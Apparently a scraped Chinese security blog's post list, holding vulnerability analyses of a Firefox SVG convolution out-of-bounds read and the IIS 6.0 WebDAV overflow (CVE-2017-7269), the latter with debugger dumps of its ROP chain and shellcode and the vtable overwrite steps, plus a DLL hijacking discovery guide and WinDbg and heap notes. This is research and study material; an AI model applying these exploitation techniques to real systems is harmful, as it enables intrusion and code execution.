int32_t aY, // 0x12d, 0x83 const int32_t *aKernel, int32_t aBias, int32_t shiftL, int32_t shiftR, bool aPreserveAlpha, int32_t aOrderX, int32_t aOrderY, // 3, 3 int32_t aTargetX, int32_t aTargetY, // 1, 1 CoordType aKernelUnitLengthX, // 1 CoordType aKernelUnitLengthY) // -1{ int32_t sum[4] = {0, 0, 0, 0}; int32_t offsets[4] = { B8G8R8A8_COMPONENT_BYTEOFFSET_R, // 2 B8G8R8A8_COMPONENT_BYTEOFFSET_G, // 1 B8G8R8A8_COMPONENT_BYTEOFFSET_B, // 0 B8G8R8A8_COMPONENT_BYTEOFFSET_A }; // 3 int32_t channels = aPreserveAlpha ? 3 : 4; int32_t roundingAddition = shiftL == 0 ? 0 : 1 &lt;&lt; (shiftL - 1); for (int32_t y = 0; y &lt; aOrderY; y++) { CoordType sampleY = aY + (y - aTargetY) * aKernelUnitLengthY; // -1 for (int32_t x = 0; x &lt; aOrderX; x++) { CoordType sampleX = aX + (x - aTargetX) * aKernelUnitLengthX; // 1 for (int32_t i = 0; i &lt; channels; i++) { sum[i] += aKernel[aOrderX * y + x] * ColorComponentAtPoint(aSourceData, aSourceStride, // 4d0 sampleX, sampleY, 4, offsets[i]); // sampleY * aSourceStride + sampleX * 4 + offsets[i] } } } ......}static inline uint8_tColorComponentAtPoint(const uint8_t *aData, int32_t aStride, int32_t x, int32_t y, size_t bpp, ptrdiff_t c){ DebugOnlyCheckColorSamplingAccess(&amp;aData[y * aStride + bpp * x + c]); return aData[y * aStride + bpp * x + c];} 这里就是 aSourceData 的访问越界。crash12345eax=00027ffa ebx=00000004 ecx=00027b40 edx=000004b8 esi=00000000 edi=18e5e008eip=634edb06 esp=0030cf98 ebp=00000004 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210206xul!mozilla::gfx::ConvolvePixel&lt;int&gt;+0x130:634edb06 0fb60438 movzx eax,byte ptr [eax+edi] ds:0023:18e86002=??对应附近的汇编如下：1234567634edb02 03c1 add eax,ecx634edb04 03c2 add eax,edx634edb06 0fb60438 movzx eax,byte ptr [eax+edi] ds:0023:0d41a4d5=00634edb0a 0faf442440 imul eax,dword ptr [esp+40h]634edb0f 0144b444 add dword ptr [esp+esi*4+44h],eax634edb13 46 inc esi634edb14 3bf3 cmp esi,ebx esp = 0030cf98 经过调试得知，和开始进去函数时的esp偏移为0x68因此对应值为：esp+0x681234567890:000&gt; dd 30d0000030d000 634ef748 0000012e 0000012e 000004d00030d010 000004c0 0000012d 00000083 0ed071c00030d020 00000000 00000016 00000000 000000000030d030 00000003 00000003 00000001 000000010030d040 00000001 ffffffff 1652d5a0 1652d5600030d050 0030d108 1652d560 00000000 000000160030d060 0ed07310 0ed07334 0ed07334 0ed071c00030d070 0ed05040 00000000 00000000 41500000因此对aSourceData 数组访问的时候，产生异常时索引值为：(0x83 + (0-1) * (-1))*0x4d0 + ((0x12d + (2-1) * 1))*4 + 2 = 0x00027ffa导致访问异常。 回到 ConvolvePixel 函数的调用 FilterNodeConvolveMatrixSoftware::DoRender 以及以上的分析，主要确定aSourceData 数组的来源和所分配的大小。 DoRender12345678.... for (int32_t y = 0; y &lt; aRect.Height(); y++) { for (int32_t x = 0; x &lt; aRect.Width(); x++) { ConvolvePixel(sourceData, targetData, aRect.Width(), aRect.Height(), sourceStride, targetStride, x, y, intKernel, bias, shiftL, shiftR, mPreserveAlpha, mKernelSize.width, mKernelSize.height, mTarget.x, mTarget.y, aKernelUnitLengthX, aKernelUnitLengthY); // 卷积计算 mKernelSize 猜测是 kernelMatrix 属性 首先是最后循环的一个卷积计算，传入的sourceData 则对应后面调用的 aSourceData。 过滤掉一些细节，通过分析后得到 aSourceData 的创建过程1234567......RefPtr&lt;DataSourceSurface&gt; input = GetInputDataSourceSurface(IN_CONVOLVE_MATRIX_IN, srcRect, NEED_COLOR_CHANNELS, mEdgeMode, &amp;mSourceRect);......DataSourceSurface::ScopedMap sourceMap(input, DataSourceSurface::READ); // 构建source map......uint8_t* sourceData = DataAtOffset(input, sourceMap.GetMappedSurface(), offset);因此sourceData 是通过 GetInputDataSourceSurface 来创建，大小的计算是依赖于输入的样本，具体计算流程比较复杂，我这里还没有完全理清楚，最终会调用SourceSurfaceAlignedRawData::Init 来进行实际的内存分配。 gfx/2d/SourceSurfaceRawData.cpp123456789101112131415161718192021222324252627282930boolSourceSurfaceAlignedRawData::Init(const IntSize &amp;aSize, SurfaceFormat aFormat, bool aClearMem, uint8_t aClearValue, int32_t aStride){ mFormat = aFormat; mStride = aStride ? aStride : GetAlignedStride&lt;16&gt;(aSize.width, BytesPerPixel(aFormat)); size_t bufLen = BufferSizeFromStrideAndHeight(mStride, aSize.height); // 获取需要分配的大小 if (bufLen &gt; 0) { bool zeroMem = aClearMem &amp;&amp; !aClearValue; static_assert(sizeof(decltype(mArray[0])) == 1, &quot;mArray.Realloc() takes an object count, so its objects must be 1-byte sized if we use bufLen&quot;); // AlignedArray uses cmalloc to zero mem for a fast path. mArray.Realloc(/* actually an object count */ bufLen, zeroMem); // 内存分配 mSize = aSize; if (mArray &amp;&amp; aClearMem &amp;&amp; aClearValue) { memset(mArray, aClearValue, mStride * aSize.height); } } else { mArray.Dealloc(); mSize.SizeTo(0, 0); } return mArray != nullptr;}通过实际的调试确认到大小为0x00026ac0，而尝试访问的位置为 0x00027ffa，因此导致越界读。 而这里的原因在于内存分配的过程中有 对非正数的考虑，实际调试中，kernelUnitLength 的值影响内存的分配，(1, 1) 分配： 0x0002bf20(1, -1) 分配： 0x00026ac0 为-1时，分配的空间偏小，但是仍能够访问到数组范围外的位置。 exp123sum[i] += aKernel[aOrderX * y + x] * ColorComponentAtPoint(aSourceData, aSourceStride, // sampleX, sampleY, 4, offsets[i]); //越界读入的值，最终会在sum中体现，卷积计算的结果最后也将反应到SVG图像中，当对整个处理计算过程熟悉的基础上，可以通过从绘制的SVG中获取到越界读取的数据信息。 debug helpenum AttributeName { eBlendBlendmode = 0, eMorphologyRadii, eMorphologyOperator, eColorMatrixType, …. eConvolveMatrixKernelUnitLength, }排序至24 值为24 或者是因为排序24link 内存分配0x4b0 * 0x96 (1, 1) 0x4b0 * 0x84 (1, -1) (10, -10)0x500 * 0x500 Reference KernelUnitLength Project Zero bugzilla Patch","link":"/2018/04/07/CVE-2017-5465/"},{"title":"CVE-2017-7269 IIS6.0 WebDAV 溢出分析","text":"基本信息该漏洞出现在 IIS 6.0 的WebDAV服务上，经过分析确定是在httpext.dll中进行处理，其中PoC以及相关的出错函数也已经给出，在ScStoragePathFromUrl中，大致看一下该函数，就是将传入的URL存储。最后的一个memcpy将最终导致覆盖到虚表指针 导致任意代码执行。 附加的是w3wp.exe @Keoyo_k0shl参考：https://www.seebug.org/vuldb/ssvid-92834环境：Win server 2003 sp2IIS 6.0 开启 WebDAV 断点进入(关键断点位置)10 e 673f6c7b 0001 (0001) 0:**** httpext!ScStoragePathFromUrl 第一次命中edx 作为参数传入 http123456789101112131415160:018&gt; gBreakpoint 0 hiteax=012cf800 ebx=01e4ed58 ecx=01e4d968 edx=01e4f460 esi=00000000 edi=77ba8ef2eip=673f6c7b esp=012cf79c ebp=012cf7ac iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206httpext!ScStoragePathFromUrl:673f6c7b b8150d4167 mov eax,offset httpext!swscanf+0x14b5 (67410d15)0:008&gt; dc edx01e4f460 00740068 00700074 002f003a 006c002f h.t.t.p.:././.l.01e4f470 0063006f 006c0061 006f0068 00740073 o.c.a.l.h.o.s.t.01e4f480 0061002f 00610061 00610061 00610061 /.a.a.a.a.a.a.a.01e4f490 78636f68 71337761 47726936 4b777a39 hocxaw3q6irG9zwK01e4f4a0 75534f70 48687a4f 6d545663 39536845 pOSuOzhHcVTmEhS901e4f4b0 5567506c 33646763 78454630 54316952 lPgUcgd30FExRi1T01e4f4c0 6a514c58 42317241 58507035 6c473664 XLQjAr1B5pPXd6Gl01e4f4d0 546a3539 54435034 50617752 6d4b3232 95jT4PCTRwaP22Km也正是 前面传入的URL作了一次MultiByteToWideChar 简单跟一次之后 一共命中了6次： 前三次一起 checkif….第一次检查第二次 数据 拷贝 (http://aaaaaaa) 主要目的是为了覆盖一个栈地址，该地址用于后面的堆分配 指定位置分配（目的是为了绕过gs的保护）第三次 数据 拷贝 (http://bbbbbbb) 布局作为后面的执行代码 后三次一起 CParseLockTokenHeader第四次开始 进入 httpext!CParseLockTokenHeader::HrGetLockIdForPath第四次不进行复制第五次 对第一个处理 用来布局 来覆盖到虚表指针 指向前面两次的数据拷贝 （因此此时虚函数指针地址在复制的首地址后面，导致复制成为可能）第六次 对第二个处理 触发触发 调用的是 ScStripAndCheckHttpPrefix -&gt; ScStripAndCheckHttpPrefix(call dword ptr [eax+24h])开始ROP 最后一次命中的数据 可以看到正好就是 第二个URL中的数据，即为ROP + shellcode 然后调用执行1234567891011121314151617181920212223242526272829303132333435360:008&gt; dc ecx680313c0 680313c0 68006e4f 68006e4f 766a4247 ...hOn.hOn.hGBjv680313d0 680313c0 4f744257 52345947 4b424b66 ...hWBtOGY4RfKBK680313e0 786f7464 68016082 727a5135 4d47747a dtox.`.h5QzrztGM680313f0 57574459 6800b113 6e6f3176 680124e3 YDWW...hv1on.$.h68031400 68031460 7ffe0300 ffffffff 680313c0 `..h...........h68031410 6803046e 7470716e 68031434 680129e7 n..hnqpt4..h.).h68031420 68009391 666e3931 30524955 766b546b ...h19nfUIR0kTkv68031430 7961724a 6803141c 68006e05 79687732 Jray...h.n.h2why0:008&gt; dc ecx+0x24680313e4 68016082 727a5135 4d47747a 57574459 .`.h5QzrztGMYDWW ### ROP680313f4 6800b113 6e6f3176 680124e3 68031460 ...hv1on.$.h`..h68031404 7ffe0300 ffffffff 680313c0 6803046e ...........hn..h68031414 7470716e 68031434 680129e7 68009391 nqpt4..h.).h...h68031424 666e3931 30524955 766b546b 7961724a 19nfUIR0kTkvJray68031434 6803141c 68006e05 79687732 366c4d69 ...h.n.h2whyiMl668031444 4d704468 68008246 32534877 68021daa hDpMF..hwHS2...h68031454 43356f6a 680313f8 680129e7 00560056 jo5C...h.).hV.V. ### shellcode0:008&gt; dc68031464 00410059 00340034 00340034 00340034 Y.A.4.4.4.4.4.4.68031474 00340034 00340034 00410051 00410054 4.4.4.4.Q.A.T.A.68031484 00410058 0041005a 00410050 00510033 X.A.Z.A.P.A.3.Q.68031494 00440041 005a0041 00420041 00520041 A.D.A.Z.A.B.A.R.680314a4 004c0041 00590041 00490041 00510041 A.L.A.Y.A.I.A.Q.680314b4 00490041 00510041 00500041 00350041 A.I.A.Q.A.P.A.5.680314c4 00410041 00500041 005a0041 00410031 A.A.A.P.A.Z.1.A.680314d4 00310049 00490041 00490041 004a0041 I.1.A.I.A.I.A.J.0:008&gt; dc680314e4 00310031 00490041 00490041 00580041 1.1.A.I.A.I.A.X.680314f4 00350041 00410038 00500041 005a0041 A.5.8.A.A.P.A.Z.68031504 00420041 00420041 00490051 00410031 A.B.A.B.Q.I.1.A.68031514 00510049 00410049 00510049 00310049 I.Q.I.A.I.Q.I.1.68031524 00310031 00410031 00410049 0051004a 1.1.1.A.I.A.J.Q.68031534 00310049 00590041 005a0041 00410042 I.1.A.Y.A.Z.B.A.68031544 00410042 00410042 00410042 00330042 B.A.B.A.B.A.B.3.68031554 00410030 00420050 00340039 004a0034 0.A.P.B.9.4.4.J.然后继续往前查看 究竟是什么时候修改覆盖的 覆盖ROP+shellcode(第三次击中)这部分其实是拷贝URL2中的内容，将其拷贝到前面设定的起始地址1234567891011121314151617180:008&gt; dc ebp-450012cf348 680312c0 00000000 00000310 01fc0070 ...h........p...012cf358 012cf40c 003a0063 0069005c 0065006e ..,.c.:.\\.i.n.e.012cf368 00700074 00620075 0077005c 00770077 t.p.u.b.\\.w.w.w.012cf378 006f0072 0074006f 0062005c 00620062 r.o.o.t.\\.b.b.b.012cf388 00620062 00620062 61757948 6f674f43 b.b.b.b.HyuaCOgo012cf398 48456b6f 67753646 38714433 5a625765 okEHF6ug3Dq8eWbZ012cf3a8 56615435 6a536952 384e5157 63555948 5TaVRiSjWQN8HYUc012cf3b8 43644971 34686472 71794758 6b55336b qIdCrdh4XGyqk3Uk0:008&gt; dc 680312c0 680312c0 003a0063 0069005c 0065006e 00700074 c.:.\\.i.n.e.t.p.680312d0 00620075 0077005c 00770077 006f0072 u.b.\\.w.w.w.r.o.680312e0 0074006f 0062002f 00620062 00620062 o.t./.b.b.b.b.b.680312f0 00620062 61757948 6f674f43 48456b6f b.b.HyuaCOgookEH68031300 67753646 38714433 5a625765 56615435 F6ug3Dq8eWbZ5TaV68031310 6a536952 384e5157 63555948 43644971 RiSjWQN8HYUcqIdC68031320 34686472 71794758 6b55336b 504f6d48 rdh4XGyqk3UkHmOP68031330 34717a46 74436f54 6f6f5956 34577341 Fzq4ToCtVYooAsW4 覆盖虚函数指针(第五次击中)这个操作在ScStoragePathFromUrl时 memcpy处理首先进入的是 httpext!CParseLockTokenHeader::HrGetLockIdForPath，这里是来调用该函数的，因此核心的两个参数，虚函数地址，以及复制的起始地址都是在这里。123456789673f575c 85c0 test eax,eax673f575e 0f84ee000000 je httpext!CParseLockTokenHeader::HrGetLockIdForPath+0x22b (673f5852)673f5764 8b0b mov ecx,dword ptr [ebx] ds:0023:012cfbe8=01e4ed58673f5766 8d85d4fdffff lea eax,[ebp-22Ch]673f576c 50 push eax673f576d ff75ec push dword ptr [ebp-14h]673f5770 ffb5e0feffff push dword ptr [ebp-120h]673f5776 e8d63cffff call httpext!CMethUtil::ScStoragePathFromUrl (673e9451)673f577b 8985c8fdffff mov dword ptr [ebp-238h],eax虚函数地址：ecx = [012cfbe8] = 01e4ed58复制的首地址：012cfab4因此进行赋值的时候溢出必定会改变012cfbe8的值，因此将会导致下次执行时虚函数的地址发生改变，导致代码执行。继续：httpext!CParseLockTokenHeader::HrGetLockIdForPath调用之前会首先访问的httpext!CMethUtil::ScStoragePathFromUrl，然后经过它进行调用。 此时虚函数的首地址发生了变化，01e4d968 复制的初始地址为 [012cf95c]=012cfab4虚表部分地址为 [012cfab0+0x10] = 01e4d968123456789101112httpext!CMethUtil::ScStoragePathFromUrl:673e9451 8bff mov edi,edi673e9453 55 push ebp673e9454 8bec mov ebp,esp673e9456 8b4910 mov ecx,dword ptr [ecx+10h]673e9459 8b5508 mov edx,dword ptr [ebp+8]673e945c 6a00 push 0673e945e ff7510 push dword ptr [ebp+10h]673e9461 ff750c push dword ptr [ebp+0Ch] ss:0023:012cf95c=012cfab4673e9464 e812d80000 call httpext!ScStoragePathFromUrl (673f6c7b)673e9469 5d pop ebp673e946a c20c00 ret 0Ch因此在最后一次执行过程中：成功覆盖到第三次拷贝的地址即这里的ecxmov ecx,dword ptr [ebx] ds:0023:012cfbe8=680313c01234567891011121314673f5708 e8a70d0000 call httpext!ScCanonicalizePrefixedURL (673f64b4)673f570d 8bd8 mov ebx,eax673f570f 85db test ebx,ebx673f5711 0f8519010000 jne httpext!CParseLockTokenHeader::HrGetLockIdForPath+0x209 (673f5830)673f5717 8b45e8 mov eax,dword ptr [ebp-18h]673f571a 8b9dc4fdffff mov ebx,dword ptr [ebp-23Ch]673f5720 8b0b mov ecx,dword ptr [ebx] ds:0023:012cfbe8=680313c0673f5722 c1e803 shr eax,3673f5725 8985d4fdffff mov dword ptr [ebp-22Ch],eax673f572b 8d85d4fdffff lea eax,[ebp-22Ch]673f5731 50 push eax673f5732 ff75ec push dword ptr [ebp-14h]673f5735 ffb5e0feffff push dword ptr [ebp-120h]673f573b e8113dffff call httpext!CMethUtil::ScStoragePathFromUrl (673e9451) 总结属于栈溢出，在第二次进入关键函数的时候就应该存在溢出了，因此Fuzz应该只需要一个URL包即可，加两个应该只是为了后面的利用。猜测的执行流程如下（次数代表击中关键函数ScStoragePathFromUrl）：第一次没太大用处，第二次 通过memcpy拷贝 aaa那里的数据 溢出覆盖第三次的堆地址首地址（由栈区的一个变量决定）；因此第三次拷贝属于 指定地址拷贝；第四次也是检查；第五次溢出覆盖函数指针指向第三次设计好的地址（这里有个疑惑就是函数指针的地址会在正常堆分配地址之后，所以导致覆盖的出现），第六次调用触发执行","link":"/2017/03/29/CVE-2017-7269/"},{"title":"如何快速识别DLL劫持漏洞","text":"DLL劫持DLL劫持漏洞是一个比较古老的漏洞类型。当一个Windows程序运行时，会尝试去动态加载一些所需的DLL，不同版本的操作系统会有不同的尝试加载顺序。优先级最高的都是当前安装程序路径下，还有就是如系统路径下，然后可能是当前文件路径。 DLL劫持的利用当能够实现安装程序路径下任意文件写的话，肯定会导致DLL劫持的发生；在XP SP2之前的话，在当前进程尝试加载当前进程目录（即安装程序目录）失败之后，将尝试加载当前目录，如果当前目录存在一个同样名称的DLL，将会被加载。第二种情况是，尝试去加载一个不存在的DLL，这个主要是因为版本更新之后，有些DLL被废弃或者其他原因，但是加载部分并没有去除。因此这部分利用就是将程序的漏洞，导致一直尝试加载失败，直至当前路径。场景为：若Firefox存在DLL劫持漏洞，那么让用户下载一个HTML文件以及一个恶意的DLL，这两个文件处于同一个路径，那么打开HTML文件将导致恶意DLL的执行。 DLL搜索顺序 如果已经加载到内存中，将不再进行搜索 如果DLL在已知DLL List中，将copy一份已知DLL，也不进行搜索已知DLL在注册表HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs. 搜索顺序将依赖于 SafeDllSearchMode 是否打开。HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode为0表示disable，1表示enable1234Safe DLL search mode is enabled by default starting with Windows XP with Service Pack 2 (SP2).Safe DLL search mode is enabled by default. To disable this feature, create the HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode registry value and set it to 0.即能够表示在XP SP2中如果没有该表项，表示默认开启状态 漏洞缓解SetDllDirectory　API，当给这个API传递一个空字符串时，将可以将当前目录从DLL搜索顺序中排除掉。 识别流程使用环境&amp;工具12Win 7 32 bit Sp1process monitor因为process monitor能够查看所有进程在尝试加载的文件以及顺序，因此设置好规则就能够判断是否存在DLL劫持漏洞。现假设准备检测Firefox的安装程序是否存在DLL劫持。Firefox打开后，进程中包含”Firefox”关键字，因此规则为:Firefox在桌面上，我们需要判断是否在尝试加载当前目录的DLL，因此设置路径为当前目录然后过滤掉加载成功的DLL保存之后，然后打开Firefox安装程序，我们发现尝试在桌面加载的DLL程序，此时只需要构造一个DLL相同名字的恶意DLL即可实现恶意DLL执行。 参考https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspxhttp://www.programlife.net/a-deep-insight-into-dll-hijacking-vulnerability.htmlhttp://www.freebuf.com/articles/78807.htmlhttps://security.tencent.com/index.php/blog/msg/20","link":"/2017/05/08/DLL-Hijacking/"},{"title":"Usage of Windbg","text":"windbg 基本命令收集 Command Usage Example lm 显示加载的module lm v ln 查看附近的符号文件 ln eax dps 查看符号 dps eax gu 执行到当前函数结束时停下 gu p 单步步过 p p2 t 单步步入 t t2 b 设置断点 ba bp 几个使用的命令与设置 Command Usage Command Usage pageheap XXXX XXX x X X X X X xwindbg的x命令用户显示所有上下文中匹配指定模板的符号, 用户寻找相应的断点位置即x 后面跟着一个正则表达式, 然后显示所有匹配的符号,1230:011&gt; x mshtml!Alternate*69bd6e80 mshtml!AlternateFontNameIfAvailable = &lt;no type information&gt;697cfd9d mshtml!AlternateFontName = &lt;no type information&gt;*代表零个或多个字符?代表一个字符+d代表一个或多个字符 x还有个作用, 在函数断下来后输入x, 会自动打印出当前的局部变量 bba 设置内存断点ba Access SizeAccess 包括 e (执行)， r (读/写)， w(写)1ba r4 0x0033c558 pageheap正常页堆 , 它在已分配的内存的后面放上几个守护字节(Guard Bytes), 类似于security cookie，再跟上一个标记为PAGE_NOACCESS的内存页。这样，已分配内存的后面如果被重写了，那么守护字节就会被改变，于是当 内存被释放 时，PageHeap就会引发一个AV。完全页堆 , 当分配一块内存时，通过调整内存块的分配位置，使其结尾恰好与系统分页边界对齐，然后在边界处再多分配一个 不可访问的页作为保护区域。因此一般UAF的洞开启页堆之后很大可能上可以定位到释放的位置, 而不是重新使用触发的AV. 用gflag.exe开启和关闭，加/full表示开启完全页堆1234gflags /p /enable calc.exe /fullgflags /I calc.exe +hpagflags /p /disable calc.exe /fullgflags /I calc.exe -hpaIE开启页堆和堆栈跟踪1gflags.exe /i iexplore.exe +ust +hpa ust(user stack trace)","link":"/2016/12/11/Command-of-Windbg/"},{"title":"FileSystemWatcher","text":"http://www.cnblogs.com/zhaojingjing/archive/2011/01/21/1941586.html","link":"/2017/06/06/FileSystemWatcher/"},{"title":"堆溢出(Windows)","text":"几个核心的函数HeapCreate12345HANDLE WINAPI HeapCreate( _In_ DWORD flOptions, _In_ SIZE_T dwInitialSize, _In_ SIZE_T dwMaximumSize);HeapAlloc","link":"/2017/02/24/Heap-Overflow/"},{"title":"HeapAlloc 由HeapAlloc看内存堆块的分配过程","text":"调试环境Win7 32bitWindbgIDA Pro 调试代码准备跟进HeapAlloc看看内存的分配过程。对应的代码如下123456789101112131415161718#include &quot;stdio.h&quot;#include &quot;windows.h&quot;int main(){ HANDLE heap ; heap = (int*)HeapCreate(0, 0x100, 0xfff) ; char *p, *q ; int size = 65533 ; __asm int 3 p = (char*)HeapAlloc(heap, 0, 65533) ; __asm int 3 q = (char*)HeapAlloc(heap, 0, 10) ; return 0 ;}因为分配过程比较复杂，涉及到多种可能情形，因此按照上述一个简单的程序以此跟进。简单看一下这个程序，先创建一个私有堆，大小为0xfff，不可扩展，然后尝试申请一个大堆块，观察分配过程。HeapCreate申请最大大小为0xfff，按照分配的必须是一个页的整数倍，因此扩展为一个普通页(0x1000) 4KB.12345678910111213140:000&gt; !heap -hIndex Address Name Debugging options enabled 1: 00160000 Segment at 00160000 to 00260000 (00003000 bytes committed) 2: 00010000 Segment at 00010000 to 00020000 (00001000 bytes committed) 3: 00020000 Segment at 00020000 to 00030000 (00010000 bytes committed) 4: 00570000 Segment at 00570000 to 00580000 (00003000 bytes committed) 5: 00760000 Segment at 00760000 to 00761000 (00001000 bytes committed)0:000&gt; r eaxeax=00760000 调用ntdll!RtlAllocateHeap(HANDLE HeapHandle, ULONG Flags, ULONG Size)会有一些判断处理，因为中间过程比较多，仅按照执行过程描述下基本流程。首先是如果申请的大小大于0x7fffffff，直接分配错误，这里是最大大小限制(32位最大2G用户地址空间)。然后是查空表，这里[eax+4]存放的是0x80，也就是128，对应的是空表标号，如标号1存放的是8 bytes，都是标号的8倍；ecx是已经除以8，因此如果该值比大于等于128，则说明从freelists[1-127]中都不存在合适的块，然后尝试在freelist[0]中查找，这里跳转到loc_77F166FF，这里提取一下这里的逻辑，大致能够猜测eax中存放的链接到下一个堆块的指针，而eax+4存放的是该堆块的大小。当[eax]为空表示已经没有下一个了，不为空就一直寻找一个合适的。当没有找到合适的时候，也就是这里的情形，将开始调用RtlpAllocateHeap进行内存分配。注：中间会将申请的内存扩展为8 bytes的倍数，因为申请时默认的分配粒度为8，即这里的Granularity。123456789100:000&gt; !heap 760000 -vIndex Address Name Debugging options enabled 5: 00760000 Segment at 00760000 to 00761000 (00001000 bytes committed) Flags: 00001000 ForceFlags: 00000000 Granularity: 8 bytes Segment Reserve: 00100000 Segment Commit: 00002000 DeCommit Block Thres: 00000200 调用RtlpAllocateHeap(int, ULONG AllocationSize, int, int)edx: dwFlags or 2ecx, ebx: Handle传入的参数为: (int, )(申请分配的大小, 8字节倍数处理, [ebp-0x10], esi)前面一些大小判断，是否为0之类的也和RtlAllocateHeap类似，不再赘述；然后是一些临界区的使用判断，RtlTryEnterCriticalSection，尝试进入一个临界区(critical section)，返回True表示可以访问 False表示被其他线程占用，这也不重要；然后与VirtualMemoryThreshold判断，VirtualMemoryThreshold是能够分配的最大值(32位为0xfe00 粒度为8)，这个网上有详细说明；这里申请小于该最大值，继续将在下图一次判断中调用RtlpExtendHeap，这里[ebp+var_38] 与 esi的值均为007600c4，这是堆句柄+0xc4偏移，指向的是FreeLists，这里判断现在还不理解。 进入ntdll!RtlpExtendHeap(ULONG FreeSize, int)第一个参数为堆句柄，第二个参数为0x10008, 即申请的大小，分配粒度为8 bytes，因此65533扩展为0x10008该函数的执行流程为首先调用RtlpFindAndCommitPages提交大小的申请，申请成功返回为非0，失败则返回0；若失败则继续判断该堆块是否可扩展，可扩展将继续扩展分配申请，不可扩展将分配失败，返回为0。这里因为申请过大，并没有足够的空闲空间供申请，因此返回0; 将继续判断是否可增长，这里是在heapHandle+0x40处保存能否增长，为2表示可增长，这里为0。然后继续判断是否要合并堆块满足分配，这里是判断是否为0x80，为0x80将进行堆块扩展来判断是否调用空闲堆块合并。这里流程比较清楚，要是不能进行合并，或者进行合并仍不能满足分配，将eax置0后返回，否则将返回分配的eax。这里因为+0x80 = 0，因此不会进行合并，直接返回eax=0。尝试分配失败。 总结这里因为是有实际的需要判断当申请分配大于堆大小的堆块时，堆管理结构的处理，因此关注的代码只是堆管理结构的很小的一部分流程。大致总结为：当HeapCreate申请创建一个私有堆时，指定大小后，系统会默认将其扩展为页大小(4K)的整数倍。然后使用HeapAlloc申请堆块时，将进入ntdll!RtlAllocateHeap中进行实际的处理，这里会有一些处理判断之类的，关键一部分是将其申请的内存大小扩展为8 bytes的整数倍。然后进入RtlpAllocateHeap进行处理，因为过大，因此也会在各种尝试之后调用ntdll!RtlpExtendHeap尝试扩展堆，当扩展失败之后，将分配失败。本次调试的关注点在于当申请分配过大的内存空间时，并不会破坏堆结构，当不设置HEAP_GENERATE_EXCEPTIONS时，那么分配失败只会返回eax=0，并不会影响后面堆块的分配。 堆信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354550:000&gt; dt _heap 760000ntdll!_HEAP +0x000 Entry : _HEAP_ENTRY +0x008 SegmentSignature : 0xffeeffee +0x00c SegmentFlags : 0 +0x010 SegmentListEntry : _LIST_ENTRY [ 0x7600a8 - 0x7600a8 ] +0x018 Heap : 0x00760000 _HEAP +0x01c BaseAddress : 0x00760000 +0x020 NumberOfPages : 1 +0x024 FirstEntry : 0x00760588 _HEAP_ENTRY +0x028 LastValidEntry : 0x00761000 _HEAP_ENTRY +0x02c NumberOfUnCommittedPages : 0 +0x030 NumberOfUnCommittedRanges : 1 +0x034 SegmentAllocatorBackTraceIndex : 0 +0x036 Reserved : 0 +0x038 UCRSegmentList : _LIST_ENTRY [ 0x760ff0 - 0x760ff0 ] +0x040 Flags : 0x1000 +0x044 ForceFlags : 0 +0x048 CompatibilityFlags : 0 +0x04c EncodeFlagMask : 0x100000 +0x050 Encoding : _HEAP_ENTRY +0x058 PointerKey : 0x75c3eb7 +0x05c Interceptor : 0 +0x060 VirtualMemoryThreshold : 0xfe00 +0x064 Signature : 0xeeffeeff +0x068 SegmentReserve : 0x100000 +0x06c SegmentCommit : 0x2000 +0x070 DeCommitFreeBlockThreshold : 0x200 +0x074 DeCommitTotalFreeThreshold : 0x2000 +0x078 TotalFreeSize : 0x14b +0x07c MaximumAllocationSize : 0x7ffdefff +0x080 ProcessHeapsListIndex : 5 +0x082 HeaderValidateLength : 0x138 +0x084 HeaderValidateCopy : (null) +0x088 NextAvailableTagIndex : 0 +0x08a MaximumTagIndex : 0 +0x08c TagEntries : (null) +0x090 UCRList : _LIST_ENTRY [ 0x760090 - 0x760090 ] +0x098 AlignRound : 0xf +0x09c AlignMask : 0xfffffff8 +0x0a0 VirtualAllocdBlocks : _LIST_ENTRY [ 0x7600a0 - 0x7600a0 ] +0x0a8 SegmentList : _LIST_ENTRY [ 0x760010 - 0x760010 ] +0x0b0 AllocatorBackTraceIndex : 0 +0x0b4 NonDedicatedListLength : 0 +0x0b8 BlocksIndex : 0x00760150 +0x0bc UCRIndex : (null) +0x0c0 PseudoTagEntries : (null) +0x0c4 FreeLists : _LIST_ENTRY [ 0x760590 - 0x760590 ] +0x0cc LockVariable : 0x00760138 _HEAP_LOCK +0x0d0 CommitRoutine : 0x075c3eb7 long +75c3eb7 +0x0d4 FrontEndHeap : (null) +0x0d8 FrontHeapLockCount : 0 +0x0da FrontEndHeapType : 0 &apos;&apos; +0x0dc Counters : _HEAP_COUNTERS +0x130 TuningParameters : _HEAP_TUNING_PARAMETERS参考：https://msdn.microsoft.com/en-us/library/windows/desktop/aa366597(v=vs.85).aspxhttps://msdn.microsoft.com/en-us/library/windows/desktop/aa366599(v=vs.85).aspxhttps://searchcode.com/file/55813729/lib/rtl/heap.c软件调试(XP和win7上的区别需自己对比)","link":"/2017/02/25/HeapAlloc/"},{"title":"IE Debug","text":"IDA 导入符号文件当已经有符号文件的时候, 可以直接导入1File -&gt; Load Files -&gt; pdb file也可以设置系统环境变量, 来导入微软的符号文件(未成功!!!)1_NT_SYMBOL_PATH = symsrv*symsrv.dll*F:\\Symbols*http://msdl.microsoft.com/download/symbols 有时候IDA无法自动下载, 可以先用windbg加载, 然后导入pdb","link":"/2016/12/10/IE-Debug/"},{"title":"整数溢出","text":"","link":"/2017/02/24/Integer-Overflow/"},{"title":"Linux 系统编程导读 - 文件I/O","text":"按照书籍的简介，对文件I/O的介绍流程为：文件I/O的相关概念、C标准的I/O接口、更高级专门化的I/O接口、文件和目录操作四个部分。 文件I/O基础这章主要介绍Linux是如何管理文件的读写操作的，从打开文件到文件关闭中途的一系列对文件的操作过程。这里注意的是4点： 文件通过文件描述符来操作，即打开一个文件，就会返回一个文件描述符；然后Linux Kernel为每一个进程维护一张打开文件表，按照文件描述符对打开的文件进行索引。当然最终还是索引到inode。 